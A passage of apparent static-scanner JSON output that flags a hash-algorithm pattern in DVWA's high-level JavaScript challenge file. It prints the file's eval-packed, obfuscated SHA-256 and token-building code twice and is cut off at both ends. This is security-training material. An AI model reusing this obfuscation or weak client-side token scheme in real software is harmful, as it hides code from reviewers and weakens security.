t;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7825,
        "endLocationLine": 1,
        "endLocationColumn": 7829
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TY